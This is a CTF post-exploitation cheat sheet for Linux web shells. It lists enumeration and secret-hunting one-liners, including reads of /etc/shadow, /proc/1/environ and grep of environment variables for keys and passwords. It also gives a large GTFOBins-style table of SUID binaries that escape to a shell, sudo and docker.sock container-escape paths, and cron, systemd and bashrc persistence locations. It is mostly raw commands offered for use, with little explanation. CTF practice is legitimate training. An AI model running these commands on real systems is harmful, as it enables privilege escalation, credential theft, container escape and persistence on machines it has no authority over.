# OS-Level — what to do once the shell is running

## The process is `www-data`/`nobody`/`apache`/`nginx` — not root

The web process user is usually unprivileged — `/root/flag` isn't
readable. The privilege ladder:

```
id;whoami;uname -a;hostname;cat /etc/os-release;env
sudo -l;find / -perm -4000 2>/dev/null;getcap -r / 2>/dev/null
ls -la /root /home /app /var/www 2>/dev/null
cat /etc/passwd;cat /etc/group;cat /etc/shadow 2>/dev/null
```

## Flag locations — the hunt-order

```
/flag /flag.txt /flag.md /flag.php /flag
/root/flag* /root/*flag* 
/home/*/flag* /home/*/*flag*
/app/flag* /var/www/flag* /var/www/html/flag* /srv/flag*
/tmp/flag* /var/tmp/flag* /dev/shm/flag*
env vars: FLAG CTF_FLAG CHALLENGE_FLAG
config: config.php settings.py .env config.yml secrets
DB: /etc/flag inside sqlite/mysql — find *.db *.sql
proc: /proc/self/environ /proc/1/environ
cron: /etc/crontab /etc/cron.d /var/spool/cron
```

The one-liner sweep:

```
find / -name '*flag*' -type f 2>/dev/null | head -50
find / -name '*flag*' 2>/dev/null | head
find / -readable -type f -exec grep -l 'flag{' {} \; 2>/dev/null | head
env | grep -iE 'flag|ctf|key|secret|pass'
grep -rE 'flag\{|FLAG|flag =|flag=' /app /var/www /etc 2>/dev/null | head
ls -la / /app /var/www /root /home /tmp /srv /opt 2>/dev/null
cat /proc/self/environ 2>/dev/null | tr '\0' '\n'
cat /root/flag* /flag* /home/*/flag* 2>/dev/null
```

## SUID/capability privesc — the standard list

```
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
sudo -l
```

GTFOBins-style reads:

| SUID binary | Read path |
|---|---|
| `find` | `find . -exec sh -c 'cat /flag' \;` |
| `awk`/`gawk`/`mawk`/`nawk` | `awk 'BEGIN{system("cat /flag")}'` |
| `tar` | `tar xf /flag -I 'sh -c cat>/tmp/o'`/`--checkpoint-action` |
| `vim`/`vi`/`less`/`more`/`man` | `:!cat /flag`/`!cat /flag` |
| `cp`/`mv`/`install`/`rsync` | copy /flag out |
| `cp`/`tee`/`dd`/`install`/`tar`/`cpio`/`rsync`/`unzip`/`7z` | file-read/write |
| `perl`/`python`/`ruby`/`php`/`node`/`lua`/`tclsh`/`irb` | `-e 'system("cat /flag")'` |
| `env`/`time`/`taskset`/`ionice`/`nice`/`timeout`/`watch`/`stdbuf`/`xargs`/`parallel` | run-command-as-arg |
| `openssl`/`ssh`/`scp`/`sftp`/`curl`/`wget`/`ftp`/`nc`/`socat`/`telnet`/`busybox` | exec/read/write |
| `gdb`/`strace`/`ltrace`/`lldb`/`rr` | `!`/`shell`/`process launch` |
| `bash`/`sh`/`dash`/`zsh`/`csh`/`ksh`/`fish`/`rbash` | a shell |
| `docker`/`podman`/`kubectl`/`nsenter`/`chroot`/`unshare`/`mount`/`ip` | container/mount |
| `systemctl`/`journalctl`/`service`/`init`/`initctl` | `!id`/config |
| `dpkg`/`apt`/`rpm`/`yum`/`zypper`/`pacman` | `!`-escape/scriptlet |
| `git`/`svn`/`hg`/`cvs`/`fossil` | `-c`/hooks/`--exec`/`pager` |
| `make`/`mvn`/`gradle`/`npm`/`pip`/`gem`/`bundle` | build-script exec |
| `crontab`/`at`/`batch` | write-jobs |
| `mysql`/`psql`/`sqlite3`/`mongo`/`redis-cli`/`sqlplus` | `!`/`\!`/`.shell`/`.run` |
| `openssl`/`ssh-keygen`/`ssh-add`/`ssh-agent` | crypto/exec |
| `sed`/`awk`/`ed`/`ex`/`vi`/`vim`/`emacs`/`nano`/`pico`/`joe`/`jstar` | script/`!` |
| `script`/`expect`/`screen`/`tmux`/`byobu`/`abduco`/`dtach` | shell-out |
| `xterm`/`urxvt`/`alacritty`/`kitty`/`gnome-terminal` | terminal |
| `ftp`/`sftp`/`lftp`/`ncftp`/`tftp`/`smbclient` | `!`-escape |
| `busybox`/`toybox`/`coreutils` | subcmd `sh` |
| `nmap`/`tcpdump`/`tshark`/`wireshark`/`dumpcap` | `--script`/`-z postrotate-command` |
| `journalctl`/`less`/`more`/`man`/`pinfo`/`info` | `!`-pager |
| `date`/`factor`/`seq`/`test`/`[`/`echo`/`printf`/`yes`/`false`/`true`/`sleep`/`env`/`printenv`/`set`/`id`/`whoami`/`hostname`/`uname`/`tty`/`stty`/`mesg`/`wall`/`write`/`w`/`who`/`users`/`last`/`uptime`/`top`/`htop`/`ps`/`pstree`/`pgrep`/`pkill`/`kill`/`killall`/`jobs`/`fg`/`bg`/`nice`/`renice`/`ionice`/`chrt`/`taskset`/`schedtool` | limited — signal/read/write |

## The `sudo -l` reads

`sudo -l` lists permitted commands — if `(ALL) NOPASSWD: /usr/bin/x` —
`x` runs as root → `sudo x` then `x`'s own exec/read/write path.

## Docker-socket / LXC / container escape

- `/var/run/docker.sock` writable → `curl --unix-socket`/`docker` API
- `/var/lib/docker/`/`/containers/` — container artifacts
- `/.dockerenv` / `/run/.containerenv` — confirm container
- `nsenter`/`unshare`/`chroot`/`cap_sys_admin` — ns/mount escape
- `k8s`/`kubectl`/`kubelet`/`/var/run/secrets/kubernetes.io` — cluster
- `lxc`/`lxd`/`rkt`/`crio` — other runtimes

## The `/proc`/`/sys` reads — environment-exfil

```
cat /proc/self/environ | tr '\0' '\n'   — process env
cat /proc/1/environ | tr '\0' '\n'      — init env — the HOST env
cat /proc/self/cmdline | tr '\0' ' '
cat /proc/self/status
cat /proc/self/maps
cat /proc/net/tcp | awk ...
cat /proc/mounts
cat /sys/class/dmi/id/product_name      — hardware
ls /proc/*/fd 2>/dev/null
```

`/proc/1/environ` — the container's init env — often carries the
container's secrets/flag.

## The cron/systemd paths — the persistent-writes

- `/etc/crontab`/`/etc/cron.d`/`/var/spool/cron/crontabs/` — cron jobs
- `/etc/systemd/system/`/`/lib/systemd/system/` — units
- `~/.config/systemd/user/` — user units
- `~/.bashrc`/`~/.profile`/`~/.bash_profile`/`~/.zshrc`/`~/.bash_aliases` — shell-init

## The "the flag IS in a service I can't reach" case

If `cat /flag` fails but a SUID binary reads it — exec that. If the
flag is in another service — `chains.md`'s lateral moves.

## Falsifiers

- every privesc path dead AND flag not in a readable path — the
  challenge may need the app's own access (a `readflag`/`sudo` entry
  designed for the web user)

## Output to record

- the verbatim flag bytes + the path/method that read them
